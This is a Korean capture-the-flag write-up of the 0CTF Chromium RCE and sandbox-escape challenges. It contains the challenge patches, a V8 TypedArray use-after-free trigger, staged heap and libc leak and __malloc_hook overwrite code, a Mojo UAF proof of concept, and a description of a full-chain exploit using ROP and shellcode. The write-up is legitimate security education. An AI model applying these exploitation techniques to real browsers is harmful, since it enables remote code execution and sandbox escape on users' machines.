@@ -1,0 +1,271 @@
+<p>라온화이트햇 핵심연구팀 이영주(<a href="mailto:boright77@naver.com">boright77@naver.com</a>)</p>
+
+<h1 id="1-intro">1. Intro</h1>
+
+<p>6월 27일부터 29일까지 진행되었던 0CTF 문제중 Chromium RCE, Chromium SBX 문제에 대한 WriteUp입니다. 두 문제는 가장 빠르게 해결하여 퍼블을 먹었습니다.</p>
+
+<h1 id="2-rce--vulnerability">2. RCE : Vulnerability</h1>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
+index b5c9dcb261..babe7da3f0 100644
+</span><span class="gd">--- a/src/builtins/typed-array-set.tq
+</span><span class="gi">+++ b/src/builtins/typed-array-set.tq
+</span><span class="p">@@ -70,7 +70,7 @@</span> TypedArrayPrototypeSet(
+     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
+     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
+     //   exception.
+<span class="gd">-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+</span><span class="gi">+    const utarget = %RawDownCast&lt;AttachedJSTypedArray&gt;(target);
+</span>
+     const overloadedArg = arguments[0];
+     try {
+<span class="p">@@ -86,8 +86,7 @@</span> TypedArrayPrototypeSet(
+       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
+       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
+       //   exception.
+<span class="gd">-      const utypedArray =
+-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+</span><span class="gi">+      const utypedArray = %RawDownCast&lt;AttachedJSTypedArray&gt;(typedArray);
+</span>
+       TypedArrayPrototypeSetTypedArray(
+           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
+</code></pre></div></div>
+
+<p>핵심적인 diff 코드는 위와 같습니다. 패치는 TypedArrayPrototypeSet 함수에서 되었으며 함수 중간에 detached된 array buffer를 z검사하는 루틴이 제거되었습니다.</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
+index 3519599a88..f1ba0fb445 100644
+</span><span class="gd">--- a/src/parsing/parser-base.h
+</span><span class="gi">+++ b/src/parsing/parser-base.h
+</span><span class="p">@@ -1907,10 +1907,8 @@</span> ParserBase&lt;Impl&gt;::ParsePrimaryExpression() {
+       return ParseTemplateLiteral(impl()-&gt;NullExpression(), beg_pos, false);
+
+     case Token::MOD:
+<span class="gd">-      if (flags().allow_natives_syntax() || extension_ != nullptr) {
+-        return ParseV8Intrinsic();
+-      }
+-      break;
+</span><span class="gi">+      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
++      return ParseV8Intrinsic();
+</span>
+     default:
+       break;
+</code></pre></div></div>
+
+<p>또한 d8에서 arraybuffer를 바로 detach 할 수 있도록 위 함수 내용이 추가되었습니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">t1</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">ab</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">t2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+
+<span class="nx">t1</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="nx">t2</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+
+<span class="nx">t2</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">t1</span><span class="p">,</span> <span class="p">{</span> <span class="na">valueOf</span><span class="p">:</span>
+    <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">ab</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>취약점은 위 코드로 트리거할 수 있습니다. t1의 버퍼를 t2로 복사하는 과정에서 t1의 버퍼를 detach하게 되면 free된 내용의 값이 t2로 복사됩니다.</p>
+
+<h1 id="3-rce--exploit">3. RCE : Exploit</h1>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">convert</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x8</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">f64</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">convert</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">u32</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">convert</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">u32</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">u2d</span><span class="p">(</span><span class="nx">lo</span><span class="p">,</span> <span class="nx">hi</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lo</span><span class="p">;</span>
+    <span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">hi</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">val</span> <span class="o">=</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
+    <span class="k">return</span> <span class="p">(</span><span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span> <span class="p">(</span><span class="nx">val</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x100000000</span> <span class="o">+</span> <span class="nx">val</span><span class="p">[</span><span class="mi">0</span><span class="p">]).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="cm">/* STAGE 1 */</span>
+<span class="kd">var</span> <span class="nx">ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">t1</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">ab</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">t2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+
+<span class="nx">t1</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="nx">t2</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+
+<span class="nx">t2</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">t1</span><span class="p">,</span> <span class="p">{</span> <span class="na">valueOf</span><span class="p">:</span>
+    <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">ab</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="kd">var</span> <span class="nx">tmp1</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">t2</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">heap</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">tmp1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">tmp1</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+<span class="kd">let</span> <span class="nx">libc</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">tmp1</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nx">tmp1</span><span class="p">[</span><span class="mi">3</span><span class="p">]));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">heap : </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">u2d</span><span class="p">(</span><span class="nx">heap</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">heap</span><span class="p">[</span><span class="mi">1</span><span class="p">])));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">libc : </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">u2d</span><span class="p">(</span><span class="nx">libc</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">libc</span><span class="p">[</span><span class="mi">1</span><span class="p">])));</span>
+</code></pre></div></div>
+
+<p>array buffer의 backing store가 free될때는 ptmalloc의 free를 사용하기 때문에 heap과 libc주소가 chunk에 남습니다. 따라서 그것을 t1의 backgin store로 가져오게 되면 heap, libc 주소를 릭할 수 있습니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* STAGE 2 */</span>
+<span class="kd">var</span> <span class="nx">abs</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">abs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">ab2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">t3</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">ab2</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">t4</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x8</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">tmp2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">libc</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">t4</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">tmp2</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="nx">value</span> <span class="o">=</span> <span class="nx">libc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x70</span> <span class="o">-</span> <span class="mh">0x23</span><span class="p">;</span>
+<span class="nx">t4</span><span class="p">[</span><span class="mh">0x0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="o">%</span><span class="mh">0x100</span><span class="p">;</span>
+<span class="nx">t4</span><span class="p">[</span><span class="mh">0x1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="o">/</span><span class="mh">0x100</span><span class="p">;</span>
+
+<span class="nx">t3</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">t4</span><span class="p">,</span> <span class="p">{</span> <span class="na">valueOf</span><span class="p">:</span>
+    <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">abs</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+        <span class="p">}</span>
+        <span class="o">%</span><span class="nx">ArrayBufferDetach</span><span class="p">(</span><span class="nx">ab2</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>UAF 취약점이 존재하는 array buffer의 backing store는 calloc으로 할당되기 때문에 tcache를 사용하지 않기 때문에 tcache를 이용한 exploit은 불가능합니다. 그래서 tcache를 전부 채워서 fastbin을 사용하게 한 뒤, fastbin의 fd를 덮어서  <code class="highlighter-rouge">__malloc_hook</code> 을 덮으면 rip를 조작할 수 있습니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">ab</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>여기서 문제가 되는것은 malloc 호출뒤에 원샷조건이 맞지 않는다는 것인데,  여러가지 javascript 함수를 호출하던 도중 JSON.stringify 함수를 호출했을때 원샷 조건이 맞다는 사실을 깨달았습니다. 그래서 이것을 이용해 쉘을 획득할 수 있었습니다.</p>
+
+<h1 id="4-sbx--vulnerability--exploit">4. SBX : Vulnerability / Exploit</h1>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/third_party/blink/public/mojom/tstorage/tstorage.mojom b/third_party/blink/public/mojom/tstorage/tstorage.mojom
+</span><span class="p">new file mode 100644
+</span><span class="gh">index 000000000000..c6c8c91905c8
+</span><span class="gd">--- /dev/null
+</span><span class="gi">+++ b/third_party/blink/public/mojom/tstorage/tstorage.mojom
+</span><span class="p">@@ -0,0 +1,20 @@</span>
+<span class="gi">+module blink.mojom;
++
++interface TStorage {
++    Init() =&gt; ();
++    CreateInstance() =&gt; (pending_remote&lt;blink.mojom.TInstance&gt; instance);
++    GetLibcAddress() =&gt; (uint64 addr);
++    GetTextAddress() =&gt; (uint64 addr);
++};
++
++interface TInstance {
++    Push(uint64 value) =&gt; ();
++    Pop() =&gt; (uint64 value);
++    Set(uint64 index, uint64 value) =&gt; ();
++    Get(uint64 index) =&gt; (uint64 value);
++    SetInt(int64 value) =&gt; ();
++    GetInt() =&gt; (int64 value);
++    SetDouble(double value) =&gt; ();
++    GetDouble() =&gt; (double value);
++    GetTotalSize() =&gt; (int64 size);
++};
+</span></code></pre></div></div>
+
+<p>취약점은 새롭게 추가된 mojo 기능에서 발생합니다. 추가된 기능은 TStorage로, Instance를 생성하여 원하는 값을 넣거나 가져올 수 있습니다. 또한 <code class="highlighter-rouge">GetLibcAddress()</code> 함수와 <code class="highlighter-rouge">GetTextAddress()</code> 함수를 통해 libc 주소와 text base 주소를 가져올 수 있었습니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">TStorageImpl</span><span class="o">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">CreateInstanceCallback</span> <span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">mojo</span><span class="o">::</span><span class="n">PendingRemote</span><span class="o">&lt;</span><span class="n">blink</span><span class="o">::</span><span class="n">mojom</span><span class="o">::</span><span class="n">TInstance</span><span class="o">&gt;</span> <span class="n">instance</span><span class="p">;</span>
+    <span class="n">mojo</span><span class="o">::</span><span class="n">MakeSelfOwnedReceiver</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">make_unique</span><span class="o">&lt;</span><span class="n">content</span><span class="o">::</span><span class="n">TInstanceImpl</span><span class="o">&gt;</span><span class="p">(</span><span class="n">inner_db_</span><span class="p">.</span><span class="n">get</span><span class="p">()),</span>
+                                <span class="n">instance</span><span class="p">.</span><span class="n">InitWithNewPipeAndPassReceiver</span><span class="p">());</span>
+
+    <span class="n">std</span><span class="o">::</span><span class="n">move</span><span class="p">(</span><span class="n">callback</span><span class="p">).</span><span class="n">Run</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">move</span><span class="p">(</span><span class="n">instance</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>취약점은 CreateInstance 함수에서 발생합니다. TInstance를 생성할 때 인자로 inner_db_를 raw pointer로 전달합니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "content/browser/tstorage/inner_db_impl.h"
+</span>
+<span class="k">namespace</span> <span class="n">content</span> <span class="p">{</span>
+
+<span class="n">InnerDbImpl</span><span class="o">::</span><span class="n">InnerDbImpl</span><span class="p">()</span> <span class="p">{}</span>
+
+<span class="n">InnerDbImpl</span><span class="o">::~</span><span class="n">InnerDbImpl</span><span class="p">()</span> <span class="p">{}</span>
+
+<span class="kt">void</span> <span class="n">InnerDbImpl</span><span class="o">::</span><span class="n">Push</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">queue_</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>하지만 inner_db_가 free될 때 따로 TInstance에 대한 처리가 없기 때문에 TInstance는 그대로 raw pointer를 가지고 있게 됩니다. 따라서 UAF 취약점이 발생합니다.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"../mojo_bindings.js"</span><span class="nt">&gt;</span> <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"../third_party/blink/public/mojom/tstorage/tstorage.mojom.js"</span><span class="nt">&gt;</span> <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">let</span> <span class="nx">sptr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">TStoragePtr</span><span class="p">();</span>
+<span class="nx">Mojo</span><span class="p">.</span><span class="nx">bindInterface</span><span class="p">(</span><span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">TStorage</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">mojo</span><span class="p">.</span><span class="nx">makeRequest</span><span class="p">(</span><span class="nx">sptr</span><span class="p">).</span><span class="nx">handle</span><span class="p">,</span> <span class="dl">"</span><span class="s2">context</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="k">async</span> <span class="nx">functioin</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">await</span> <span class="nx">sptr</span><span class="p">.</span><span class="nx">init</span><span class="p">();</span>
+	<span class="kd">let</span> <span class="nx">ins1</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">sptr</span><span class="p">.</span><span class="nx">createInstance</span><span class="p">()).</span><span class="nx">instance</span><span class="p">;</span>
+	<span class="k">await</span> <span class="nx">sptr</span><span class="p">.</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
+  <span class="c1">// heap spray</span>
+	<span class="nx">ins1</span><span class="p">.</span><span class="nx">getTotalSize</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="nx">main</span><span class="p">();</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>위와 같은 코드로 poc를 작성할 수 있습니다. <code class="highlighter-rouge">ins1.getTotalSize();</code>은 free된 inner_db_를 사용하므로 만약 <code class="highlighter-rouge">getTotalSize</code> 를 호출하기 전에 heap spray를 통해 inner_db_를 덮어쓴다면 원하는 주소로 rip를 변경할 수 있게 됩니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="n">content</span> <span class="p">{</span>
+    <span class="k">class</span> <span class="nc">InnerDbImpl</span> <span class="o">:</span> <span class="n">InnerDb</span> <span class="p">{</span>
+    <span class="nl">public:</span>
+        <span class="n">InnerDbImpl</span><span class="p">();</span>
+        <span class="o">~</span><span class="n">InnerDbImpl</span><span class="p">()</span> <span class="k">override</span><span class="p">;</span>
+
+        <span class="kt">void</span> <span class="n">Push</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">value</span><span class="p">);</span>
+        <span class="kt">uint64_t</span> <span class="n">Pop</span><span class="p">();</span>
+        <span class="kt">void</span> <span class="n">Set</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">index</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">);</span>
+        <span class="kt">uint64_t</span> <span class="n">Get</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">index</span><span class="p">);</span>
+        <span class="kt">void</span> <span class="n">SetInt</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">value</span><span class="p">);</span>
+        <span class="kt">int</span> <span class="n">GetInt</span><span class="p">();</span>
+        <span class="kt">void</span> <span class="n">SetDouble</span><span class="p">(</span><span class="kt">double</span> <span class="n">value</span><span class="p">);</span>
+        <span class="kt">double</span> <span class="n">GetDouble</span><span class="p">();</span>
+        <span class="kt">uint64_t</span> <span class="n">GetTotalSize</span><span class="p">()</span> <span class="k">override</span><span class="p">;</span>
+
+        <span class="n">std</span><span class="o">::</span><span class="n">array</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="p">,</span> <span class="mi">200</span><span class="o">&gt;</span> <span class="n">array_</span><span class="p">;</span>
+        <span class="n">base</span><span class="o">::</span><span class="n">queue</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="o">&gt;</span> <span class="n">queue_</span><span class="p">;</span>
+        <span class="kt">int64_t</span> <span class="n">int_value_</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="kt">double</span> <span class="n">double_value_</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
+    <span class="p">};</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>또한 InnerDbImpl class를 보면 queue_가 존재하고 기능중에 그 queue_에 값을 push 하거나 pop할 수 있는 기능이 존재합니다. 따라서 free된 InnerDbImpl를 heap spray를 통해 덮어쓴다면 queue_가 내부적으로 가르키고 있는 주소를 변경하여 arbitrary address read/write가 가능해집니다. 그래서 rip를 변경할 수 있는 기능과 원하는 메모리 주소를 읽고 쓸 수 있는 기능을 통해 sandbox를 escape할 수 있습니다.</p>
+
+<h1 id="5-chromium-full-chain">5. Chromium Full Chain</h1>
+
+<p>Chromium Full Chain의 경우 대회때 시간이 부족하여 해결하지 못하고 대회가 끝난 뒤에 풀 수 있었습니다. 문제는 위 두가지 exploit을 체이닝하는 문제였는데 바뀐점이 array buffer가 ptmalloc을 사용하지 않게되고 원래 chrome에서 array buffer의 backing store를 할당할 때 사용하는 partition allocator를 사용하게 된 점입니다. 그래서 renderer exploit을 처음부터 새로 작성해야 했습니다.</p>
+
+<p>먼저 취약점을 통해 free된 chunk에 next ptr을 덮어 chunk를 원하는곳에 할당할 수 있었습니다. 하지만 이전과 같이 libc leak이 존재하지 않기 때문에 바로 rip를 컨트롤하는게 불가능했습니다. 그래서 heap leak을 먼저 하고 chunk가 할당된 page 위쪽에 존재하는 slot을 이용해 text 주소를 leak 했습니다.</p>
+
+<p>그리고 leak한 chrome binary 주소중 rw 권한이 있는 영역에 값을 쭉 덮어보면서 rip가 컨트롤 되는 부분을 찾았습니다. 이후 스택 피벗을 통해 ROP를 성공하여 쉘코드를 실행한 뒤에, RenderFrameImpl 객체를 찾아 enabled_bindings_을 2(BINDINGS_POLICY_MOJO_WEB_UI)로 변경하고 새로고침하면 Mojo를 활성화할 수 있었습니다. mojo를 활성화 한 다음엔, 이미 작성 했던 mojo exploit 코드를 그대로 사용하여 sandbox escape를 할 수 있었습니다.</p>
+
+<p>대회 중에는 renderer에서 쉘코드를 실행시키는것까진 성공했지만 쉘코드 실행 이후 다시 정상적인 실행 흐름을 복구하는것에 삽질을 너무 많이해서 못풀었습니다. 시간이 좀 더 있었다면 풀 수 있었을 것 같습니다.</p>
